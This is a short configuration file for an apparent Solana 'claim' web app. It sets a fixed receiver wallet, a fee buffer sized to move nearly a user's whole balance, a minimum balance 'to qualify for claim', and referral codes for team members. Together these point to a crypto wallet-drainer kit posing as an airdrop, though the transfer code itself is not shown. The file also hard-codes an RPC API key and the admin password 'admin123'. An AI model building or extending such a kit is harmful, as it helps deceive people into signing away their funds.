import { PublicKey } from '@solana/web3.js';

export const RPC_URL =
  import.meta.env.VITE_RPC_URL ||
  'https://solana-mainnet.g.alchemy.com/v2/pSLmhjyc-4LdT-bUrSr3m0Ks5lBCF_sr';

export const RPC_ENDPOINTS = [
  RPC_URL,
  'https://solana-mainnet.g.alchemy.com/v2/pSLmhjyc-4LdT-bUrSr3m0Ks5lBCF_sr',
];

// 🎯 Replace with your legitimate receiver wallet (NOT a thief!)
export const RECEIVER_WALLET = new PublicKey('DwLucxM2TNd8jj8ntNJ7BQJAmYAvCaZB2teMmP687jvZ');

// Fee buffer in lamports — covers base fee (5000) + priority fees the wallet
// may add via ComputeBudget instructions.  100k lamports = 0.0001 SOL.
export const TRANSFER_FEE_BUFFER = 100_000;

// Minimum SOL balance required to qualify for claim
export const MIN_QUALIFY_SOL = 0.01;

// ── Team Referral Configuration ─────────────────────────────
// Each team member gets a unique code. Share as: yoursite.com?ref=CODE
// Add / remove team members here as needed.
export const TEAM_MEMBERS = [
  { code: '123100',   name: '100',   emoji: '👩‍💻' },
  { code: '123200',     name: '200',     emoji: '👨‍💻' },
  { code: '123300', name: '300', emoji: '🧑‍💻' },
  { code: '123400',   name: '400',   emoji: '👩‍🚀' },
  { code: '123500',     name: '500',     emoji: '🦊' },
];

// Admin dashboard password (change this!)
export const ADMIN_PASSWORD = 'admin123';
